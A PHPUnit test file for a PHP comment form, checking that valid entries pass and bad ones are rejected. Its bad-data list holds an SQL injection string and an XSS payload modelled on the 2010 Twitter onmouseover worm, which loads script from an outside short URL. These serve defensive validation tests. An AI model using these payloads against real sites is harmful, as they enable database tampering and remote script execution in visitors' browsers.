<?php
class Application_Form_CommentFormTest extends PHPUnit_Framework_TestCase
{
    protected $_form;
    
    protected function setUp()
    {
        $this->_form = new Application_Form_CommentForm();
        parent::setUp();
    }
    protected function tearDown()
    {
        parent::tearDown();
        $this->_form = null;
    }
    public function goodData()
    {
        return array (
            array ('John Doe', 'john.doe@example.com', 
                   'http://example.com', 'test comment'),
            array ("Matthew Weier O'Phinney", 'matthew@zend.com', 
                   'http://weierophinney.net', 'Doing an MWOP-Test'),
            array ('D. Keith Casey, Jr.', 'Keith@CaseySoftware.com', 
                   'http://caseysoftware.com', 'Doing a monkey dance'),
        );
    }
    /**
     * @dataProvider goodData
     */
    public function testFormAcceptsValidData($name, $mail, $web, $comment)
    {
        $data = array (
            'name' => $name, 'mail' => $mail, 'web' => $web, 'comment' => $comment,
        );
        $this->assertTrue($this->_form->isValid($data));
    }
    public function badData()
    {
        return array (
            array ('','','',''),
            array ("Robert'; DROP TABLES comments; --", '', 'http://xkcd.com/327/','Little Bobby Tables'),
            array (str_repeat('x', 1000), '', '', ''),
            array ('John Doe', 'jd@example.com', "http://t.co/@\"style=\"font-size:999999999999px;\"onmouseover=\"$.getScript('http:\u002f\u002fis.gd\u002ffl9A7')\"/", 'exploit twitter 9/21/2010'),
        );
    }
	/**
     * @dataProvider badData
     */
    public function testFormRejectsBadData($name, $mail, $web, $comment)
    {
        $data = array (
            'name' => $name, 'mail' => $mail, 'web' => $web, 'comment' => $comment,
        );
        $this->assertFalse($this->_form->isValid($data));
    }
}